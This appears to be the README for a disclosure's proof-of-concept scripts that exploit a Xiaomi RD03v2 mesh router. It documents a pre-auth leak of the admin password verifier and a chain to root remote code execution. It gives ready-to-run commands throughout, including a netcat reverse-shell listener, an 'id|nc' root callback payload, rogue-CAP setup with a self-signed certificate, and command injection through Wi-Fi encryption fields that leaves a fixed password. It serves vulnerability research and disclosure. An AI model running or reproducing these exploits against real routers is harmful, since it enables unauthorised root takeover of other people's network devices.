# Proof-of-concept scripts

Pure Python 3 (stdlib only); no external packages. (A couple of helpers shell out to
`ip` to detect the attacker's local MAC/IP for the login nonce, with a hard-coded
fallback if it is absent.) Each script documents its mechanics in its module
docstring; the `cab_meshd` internals are in
[`../technical-appendix.md`](../technical-appendix.md).

> Run only against a device you own. CAP-side clients default to
> `192.168.31.1` via `--host` and retry around the daemon's connection-slot
> stall. `re_wan_rce.py` instead listens as a rogue CAP on `--bind`
> (`192.168.77.1` by default) and waits up to 90 seconds for the factory RE.

| Script | For | What it does |
|---|---|---|
| `init_router.py` | prep | Minimally initializes a *factory* unit through `router_init`, sets `INITTED=YES`, and opens the CAP listener after reboot while leaving `NETMODE` unset. This differs from the normal web wizard, which can set `whc_cap`. It retains the factory admin verifier. |
| `extract_admin.py` | **V1** | Leak `web_passwd256` over 19553, then mint an admin `stok`. Sends no `type-7` and changes no persistent configuration, but creates transient session/replay state. Confirmed on hardware. |
| `ota_rce.py` | **V1+V2** | **Root RCE in the tested gate-open mode.** Chains V1 → V2 via `encryption`-field injection and a root callback. Stops before planting unless `get_netmode` confirms numeric `0`. **Confirmed on hardware after minimal initialization.** |
| `re_wan_rce.py` | **V2 RE/WAN** | **Direct pre-auth root RCE against a factory-reset router.** Answers WAN discovery as a rogue CAP, authenticates with the `x` key, sends type-6, and captures `uid=0(root)`. No V1, admin session, or `init_router.py`. **Confirmed on hardware.** |
| `handshake.py` | inspection | Full mesh protocol driver: forges the constant-key handshake to `ST_RUNNING` and prints the CAP's sync config (where `web_passwd256` appears). `--no-trigger` stops before `cap_init`; `--dump-sync PATH` saves the raw type-6 body. |
| `rce_poc.py` | **V2** | **Root command execution (CAP/LAN direct path).** base64'd `--cmd` in the type-4 **plant** (`body[0x90]`), full `4→5→7` handshake. Confirmed in emulation (root-owned file). ~4-char one-shot. Used as the trigger component of `ota_rce.py`. See `../v2-root-rce.md`. |

## Primary run (device you own)

The V2 hardware test used the gate-open mode left by `init_router.py`. On an
ordinarily web-configured unit, `NETMODE=whc_cap` can block the demonstrated
CAP root path even though V1 admin takeover still works. A full reset erases
settings; repeating the normal web wizard can set the same mode again. See
[`../v2-root-rce.md`](../v2-root-rce.md).

```bash
# only if the unit is at factory defaults (19553 closed):
python3 init_router.py --host 192.168.31.1 --reboot

# V1 — non-destructive admin takeover:
python3 extract_admin.py --host 192.168.31.1
#   -> leaks web_passwd256 and prints a valid admin stok

# inspection — dump the sync config that leaks the verifier:
python3 handshake.py --host 192.168.31.1 --no-trigger
```

Minimal initialization keeps the shipped admin verifier and opens the mesh
listener. Use an isolated network and complete the intended test or install
promptly; ordinary web setup is a different path and can close the V2 gate.

The factory RE/WAN PoC below is a separate path. It does not use this preparation.

## V1-assisted OTA CAP delivery (confirmed on hardware)

This section assumes the preparation immediately above has completed: the router
was factory-reset, `init_router.py --reboot` set `INITTED=YES`, the CAP listener is
running, and `NETMODE` remains unset. `ota_rce.py` does not perform that preparation.

```bash
# Terminal 1 — run the PoC (starts its own HTTP server on port 8000):
python3 ota_rce.py --host 192.168.31.1 --attacker 192.168.31.231

# Terminal 2 — catch the reverse shell:
nc -l -p 4444
```

After preparation, `ota_rce.py` automates the V1-assisted V2 delivery:
1. **V1** — leaks `web_passwd256`, mints admin `stok` (pre-auth, over Wi-Fi)
2. **Plant** — writes injection payloads into Wi-Fi `encryption` UCI keys via
   `set_wifi_without_restart`; preserves the original SSID
3. **Trigger** — fires `cap_init` via the `type-4→5→7` handshake
4. **Catch** — waits for the root callback (`/pwned?uid=0_user=root`) and the
   self-repair confirmation; the reverse shell connects to `nc` on port 4444

Be precise about what the self-repair does, because it changes your AP: `cap_init`
reconfigures the radios from the poisoned `encryption` values, and the payload then
overwrites any interface still holding the injected value with
**`encryption=psk2`, `key=meshpoc12345`**. So after a successful run the AP is
**WPA2 with that fixed password**, whatever it was before — including a unit that
started out open. Reconnect with:

```bash
nmcli dev wifi connect <ssid> password meshpoc12345
```

If you joined the **open** factory AP earlier in the run, the saved open profile for
that SSID shadows the new WPA2 one and `nmcli` fails with
`802-11-wireless-security.key-mgmt: property is missing`. Forget that profile first,
then retry. The reverse shell loop retries every 10 seconds, so if the `nc` listener
disconnects, starting a new one picks up a fresh shell.

This V1-assisted V2 delivery was confirmed over Wi-Fi on physical RD03v2 hardware after
minimal initialization left `NETMODE` unset. Reachability after ordinary
Xiaomi web setup has not been demonstrated. See `../v2-root-rce.md` for the
technical breakdown.

## V2 RE/WAN — direct factory root RCE (confirmed on hardware)

Connect an isolated attacker interface to any Ethernet socket on a factory-reset
RD03v2; stock WAN/LAN autosensing selects the live socket as WAN. The attacker-side
segment must provide DHCP and a gateway address. In the hardware test the attacker
was `192.168.77.1/24` and the router lease was `192.168.77.142`.

Create a short-lived self-signed certificate, then run the rogue CAP as root (the
proof listener binds TCP/80):

```bash
openssl req -x509 -newkey rsa:2048 -nodes -days 1 \
  -subj /CN=rogue-cap \
  -keyout /tmp/re-wan-key.pem -out /tmp/re-wan-cert.pem

sudo python3 re_wan_rce.py \
  --bind 192.168.77.1 \
  --cert /tmp/re-wan-cert.pem --key /tmp/re-wan-key.pem
```

The default proof expression is `` `id|nc 192.168.77.1 80` ``. Success prints:

```
[ROOT PROOF] callback from 192.168.77.142: uid=0(root) gid=0(root)
[+] CONFIRMED: RE/WAN payload executed as uid 0 (root)
```

`--raw-pswd` accepts a different expression, but the built-in success check only
recognizes `uid=0(...)` sent to `BIND:80` or an HTTP request for `/0`. A custom
payload that has no callback may execute, consume the one-shot factory state, and
still make the PoC time out with status 1; absence of a callback is not proof of
non-execution.

The PoC embeds a stock-compatible 1,764-byte type-6 layout. It deliberately fills
four otherwise-empty front-haul fields so unquoted `$@` does not shift the
controlled `bh_pswd` away from `do_re_init` `$8`. `--template` can instead load a
raw type-6 body captured with
`handshake.py --dump-sync /tmp/type6.bin --no-trigger`.
The dump includes `web_passwd*` and may contain Wi-Fi credentials; the helper
creates it mode `0600`. Store and delete it as credential material.

A successful run completes `re_init`, sets `INITTED=YES`, changes network/Wi-Fi
configuration, and stops the factory RE daemon. Factory-reset the device before
repeating the test.

## V2 — direct root command execution (CAP/LAN path, emulation)

```bash
python3 rce_poc.py --host 192.168.31.1 --cmd '>W'   # creates root-owned /W; ~4-char budget
```

Delivers `base64('`>W`')` in the type-4 plant, completes `4→5→7`, and the daemon
drives `mimesh_init`'s `eval` as root when the CAP gate is open. Confirmed in
emulation. A completed `cap_init` can set `NETMODE=whc_cap` and close that gate;
the shell also skips `NETMODE=lanapmode` with `CAP_MODE=ap`. Supported reproduction
uses API `get_netmode=0` with UCI `NETMODE` unset.
The payload budget is ~4 characters here. The RE/WAN path has a larger 32/64-byte
reliable budget and is confirmed end-to-end on hardware; see `../v2-root-rce.md`.
`ota_rce.py` uses the CAP handshake as its trigger and plants the longer payload
through the admin Wi-Fi API in the tested gate-open state.

## Safety / footprint
- `extract_admin.py` and `handshake.py --no-trigger` do not alter persistent
  configuration; `extract_admin.py` creates transient login/session state.
- `ota_rce.py` modifies the device's Wi-Fi encryption UCI keys and triggers
  `cap_init`; the self-repairing payload restores valid encryption afterward, but the
  trigger can change `NETMODE` and Wi-Fi state.
- **If the CAP mode is gated or cannot be confirmed, `ota_rce.py` stops before
  planting anything.** `NETMODE=whc_cap` blocks this sink but does not prove a
  previous exploit; `lanapmode` with `CAP_MODE=ap` also skips it. On an owned
  test unit, a full reset followed by the minimal
  `init_router.py` setup can reproduce the tested gate-open state; a normal web
  setup can close it again.
- `rce_poc.py` sends a `cap_init` trigger and can execute its short command on a
  gate-open unit.
- `re_wan_rce.py` completes `re_init` and changes the factory router into an
  initialized mesh RE. A factory reset is required to restore the starting state.
